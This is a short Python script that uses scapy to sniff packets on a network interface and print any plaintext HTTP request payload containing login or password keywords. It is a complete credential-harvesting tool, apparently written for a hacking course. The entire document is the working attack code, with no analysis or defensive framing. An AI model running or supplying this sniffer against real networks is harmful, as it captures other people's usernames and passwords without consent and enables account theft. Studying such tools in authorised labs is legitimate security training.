#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #udp/arp/port 80/21 /TCP


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "uname", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print(load)


sniff("eth0") 
